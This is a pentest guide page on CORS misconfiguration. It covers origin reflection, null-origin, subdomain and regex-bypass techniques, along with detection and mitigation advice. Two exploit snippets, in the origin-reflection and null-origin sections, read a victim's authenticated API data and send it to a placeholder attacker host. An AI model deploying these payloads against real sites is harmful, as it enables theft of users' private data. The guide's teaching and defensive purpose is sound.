% Filename: 04-web-testing/client-side/cors.md
% Display name: CORS Misconfiguration
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1189 (Drive-by Compromise)
% Authors: @TristanInSec

# CORS Misconfiguration

## Overview

Cross-Origin Resource Sharing (CORS) controls which external origins can access resources via JavaScript. When misconfigured, it allows attacker-controlled websites to read authenticated responses from the target application — extracting sensitive data like API keys, user profiles, CSRF tokens, and internal information. CORS misconfiguration turns a "read" restriction bypass into a data theft vector.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1189 - Drive-by Compromise

## Prerequisites

- Application returns sensitive data in API responses or page content
- CORS headers misconfigured to allow unauthorized origins
- Victim must be authenticated and visit the attacker's page

## How CORS Works

Browsers enforce the Same-Origin Policy (SOP) — JavaScript on `evil.com` cannot read responses from `target.com`. CORS relaxes this by letting the server declare which origins are allowed.

Key response headers:

```text
Access-Control-Allow-Origin: https://trusted.com    (allowed origin)
Access-Control-Allow-Credentials: true               (include cookies)
Access-Control-Allow-Methods: GET, POST               (allowed methods)
Access-Control-Allow-Headers: Content-Type, X-Custom   (allowed headers)
```

If `Access-Control-Allow-Origin` includes the attacker's origin and `Access-Control-Allow-Credentials: true` is set, the attacker's JavaScript can read authenticated responses.

## Detection Methodology

### Testing for CORS Misconfigurations

Send requests with manipulated `Origin` headers and observe the response:

```bash
# Test origin reflection
curl -s -H "Origin: https://evil.com" -I http://target.com/api/user | grep -i "access-control"

# Test null origin
curl -s -H "Origin: null" -I http://target.com/api/user | grep -i "access-control"

# Test subdomain
curl -s -H "Origin: https://sub.target.com" -I http://target.com/api/user | grep -i "access-control"

# Test origin with target domain as prefix
curl -s -H "Origin: https://target.com.evil.com" -I http://target.com/api/user | grep -i "access-control"

# Test origin with target domain as suffix
curl -s -H "Origin: https://eviltarget.com" -I http://target.com/api/user | grep -i "access-control"
```

## Techniques

### Origin Reflection

The most common misconfiguration — the server reflects any `Origin` header back in `Access-Control-Allow-Origin`:

```text
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true
```

**Exploit:**

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://target.com/api/user', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    // Send stolen data to attacker
    fetch('http://ATTACKER_IP:8000/?data=' + btoa(xhr.responseText));
  }
};
xhr.send();
</script>
```

The victim's browser sends their session cookie, and the response is readable by the attacker's script because the server reflected the attacker's origin.

### Null Origin Exploitation

Some servers whitelist the `null` origin — which browsers send in several contexts:

- Sandboxed iframes (`<iframe sandbox>`)
- File protocol requests (`file://`)
- Cross-origin redirects

```text
Request:  Origin: null
Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true
```

**Exploit:**

```html
<iframe sandbox="allow-scripts"
  srcdoc="<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://target.com/api/user', true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        fetch('http://ATTACKER_IP:8000/?data=' + btoa(xhr.responseText));
      }
    };
    xhr.send();
  </script>">
</iframe>
```

The sandboxed iframe sends `Origin: null`, which the server accepts.

### Subdomain Trust Exploitation

The server trusts all subdomains via regex like `*.target.com`:

```text
Request:  Origin: https://evil.target.com
Response: Access-Control-Allow-Origin: https://evil.target.com
          Access-Control-Allow-Credentials: true
```

If the attacker can find XSS on any subdomain, or if a subdomain is compromised/takeable, they can exploit the CORS trust from that subdomain.

### Prefix/Suffix Matching Bypass

Weak regex validation may match incorrectly:

```bash
# Server regex: /target\.com$/
# Bypass: attacker registers eviltarget.com
Origin: https://eviltarget.com    ← matches suffix check

# Server regex: /^https:\/\/target\.com/
# Bypass:
Origin: https://target.com.evil.com   ← matches prefix check
```

### Wildcard with Credentials

The specification does not allow `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. But some servers return:

```text
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Modern browsers reject this combination. However, older browsers or non-browser clients may not enforce this restriction.

### Exploiting Pre-Flight Cache

The `Access-Control-Max-Age` header caches pre-flight responses. If a legitimate origin sends a pre-flight that gets cached, subsequent requests from the same origin skip the pre-flight check — the cached permission is used.

### Chaining CORS with XSS

CORS misconfiguration becomes critical when combined with XSS on a trusted origin:

1. Find CORS policy trusting `*.target.com` subdomains
2. Find XSS on `blog.target.com` (any subdomain)
3. Use XSS on the subdomain to make authenticated CORS requests to `api.target.com`
4. Exfiltrate the data

## Detection Methods

### Network-Based Detection

- Responses with `Access-Control-Allow-Origin` reflecting arbitrary origins
- `Access-Control-Allow-Credentials: true` paired with dynamic `Allow-Origin` values
- Cross-origin requests from external origins to authenticated API endpoints
- `null` in `Access-Control-Allow-Origin` responses

### Host-Based Detection

- Audit CORS configuration in application code and web server config
- Monitor for `Access-Control-Allow-Origin` headers in HTTP responses containing sensitive data
- Log all unique `Origin` values received on sensitive endpoints

## Mitigation Strategies

- **Explicit origin whitelist** — maintain a strict list of allowed origins. Never reflect the `Origin` header directly. Never use regex that allows prefix/suffix matching attacks
- **Never allow `null` origin** — the `null` origin is trivially forgeable via sandboxed iframes
- **Avoid `Access-Control-Allow-Origin: *` on authenticated endpoints** — wildcard is acceptable for truly public resources (CDN assets, public APIs) but never for endpoints that return user-specific data
- **Minimize `Access-Control-Allow-Credentials: true`** — only enable when credentials are genuinely needed for cross-origin requests
- **Validate on the server** — do not rely on browser CORS enforcement as a security control. Server-side authorization must independently verify the requester's access rights
- **Restrict allowed methods and headers** — only permit the HTTP methods and custom headers that cross-origin requests actually need

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - CORS](https://portswigger.net/web-security/cors)
- [OWASP - CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)

### Official Documentation

- [MDN - Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

### MITRE ATT&CK

- [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
